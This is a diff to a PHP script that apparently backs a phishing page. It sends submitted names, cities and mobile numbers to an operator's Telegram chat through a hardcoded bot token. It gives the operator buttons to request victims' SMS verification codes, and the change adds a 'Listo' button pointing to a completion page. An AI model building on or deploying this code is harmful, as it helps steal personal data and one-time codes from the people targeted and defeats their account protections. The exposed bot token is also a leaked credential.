@@ -5,6 +5,12 @@ session_start();
 $BOT_TOKEN = '8036763317:AAGJbdfFqJt3yi_MwhnP1_DXsSug9oW31HY';
 $CHAT_ID   = '-1003373393956';
 
+// URL absoluta hacia la página de finalización (finalizado.html)
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
+$host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$basePath = rtrim(dirname($_SERVER['REQUEST_URI'] ?? '/'), '/\\');
+$URL_FINALIZADO = $scheme . $host . $basePath . '/finalizado.html';
+
 function rutaCodigos()
 {
     return __DIR__ . '/codigos.json';
@@ -128,6 +134,10 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
                     'text' => '📩 SMS',
                     'callback_data' => 'PEDIR_SMS|' . $celular,
                 ],
+                [
+                    'text' => '✅ Listo',
+                    'url'  => $URL_FINALIZADO,
+                ],
             ],
         ],
     ];
@@ -176,6 +186,10 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
                 [
                     'text' => '📩🔄 SMS',
                     'callback_data' => 'PEDIR_SMS|' . $telefono,
+                ],
+                [
+                    'text' => '✅ Listo',
+                    'url'  => $URL_FINALIZADO,
                 ],
             ],
         ],
